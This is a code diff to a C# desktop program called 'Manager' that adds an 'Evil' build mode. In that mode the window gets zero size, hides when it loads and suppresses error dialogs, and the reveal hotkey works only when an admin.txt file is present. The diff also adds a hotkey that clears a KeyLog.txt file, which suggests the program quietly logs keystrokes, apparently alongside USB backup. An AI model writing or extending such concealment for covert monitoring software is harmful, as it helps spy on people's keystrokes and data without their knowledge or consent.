@@ -40,6 +40,11 @@ namespace Manager
         {
             App.WdMain = this;
             InitializeComponent();
+#if Evil
+            Height = 0;
+            Width = 0;
+#endif
+
         }
         private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
         {
@@ -55,6 +60,9 @@ namespace Manager
         }
         private void Window_Loaded(object sender, RoutedEventArgs e)
         {
+#if Evil
+            Hide();
+#endif
             try
             {
                 HotKey hotKey_Window = new HotKey(ModifierKeys.Control, Keys.Y, this);
@@ -62,18 +70,34 @@ namespace Manager
             }
             catch (Exception ex)
             {
-#if DEBUG
+#if !Evil
                 System.Windows.MessageBox.Show("绑定唤醒热键失败,程序将退出:<");
 #endif
                 ULogger.WriteException(ex);
                 App.Current.Shutdown();
             }
+            try
+            {
+                HotKey hotKey_ClearKeyLog = new HotKey(ModifierKeys.Control, Keys.U, this);
+                hotKey_ClearKeyLog.HotKeyPressed += (k) => { File.WriteAllText("KeyLog.txt", ""); };
+            }
+            catch (Exception)
+            {
 
+
+            }
             App.backGround = new BackGround(this);
             TbUsbBackupPath.Text = st.Default.UsbBackupPath;
         }
         private void HotKey_Window_HotKeyPressed(HotKey obj)
         {
+#if Evil
+            if (!File.Exists("admin.txt"))
+            {
+                Console.WriteLine(654);
+                return;
+            }
+#endif
             Visibility = (Visibility == Visibility.Visible) ? Visibility.Collapsed : Visibility.Visible;
             Topmost = true;
             Topmost = false;
